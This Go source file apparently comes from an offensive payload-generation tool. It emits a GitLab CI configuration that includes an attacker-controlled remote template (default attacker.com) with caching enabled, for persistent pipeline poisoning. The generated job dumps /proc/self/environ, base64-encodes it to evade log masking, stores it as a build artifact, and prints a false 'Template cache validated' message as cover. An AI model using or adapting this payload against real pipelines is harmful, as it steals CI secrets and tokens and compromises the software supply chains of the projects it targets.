package payloads

import "fmt"

// RemoteIncludeCacheOptions configures a remote include cache poisoning payload.
type RemoteIncludeCacheOptions struct {
	Common       CommonOptions
	RemoteURL    string // attacker-controlled URL
	CacheTTL     string // cache duration (default: "1h")
	PoisonedYAML string // malicious YAML content served at URL
	CallbackURL  string
}

// GenerateRemoteIncludeCacheYAML generates a CI config that includes a remote
// URL with cache enabled (GitLab 19.0+), allowing persistent cache poisoning.
func GenerateRemoteIncludeCacheYAML(o RemoteIncludeCacheOptions) string {
	name, stage := o.Common.defaults("cache-seed")
	if o.RemoteURL == "" {
		o.RemoteURL = "https://attacker.com/ci-template.yml"
	}
	if o.CacheTTL == "" {
		o.CacheTTL = "1h"
	}

	return fmt.Sprintf(`include:
  - remote: %s
    cache: "%s"

stages: [%s]

%s:
  stage: %s%s%s
  script:
    - |
      # Exfil via base64-encoded /proc/self/environ (bypasses log masking)
      cat /proc/self/environ 2>/dev/null | tr '\0' '\n' | base64 -w0 > .template-cache.b64 || true
      echo "Template cache validated"
  artifacts:
    when: always
    paths:
      - .template-cache.b64
    expire_in: 1 day
  allow_failure: true%s
`, o.RemoteURL, o.CacheTTL, stage, name, stage,
		imageLine(o.Common.Image), tagsLine(o.Common.Tags),
		rulesManual(o.Common.Manual))
}
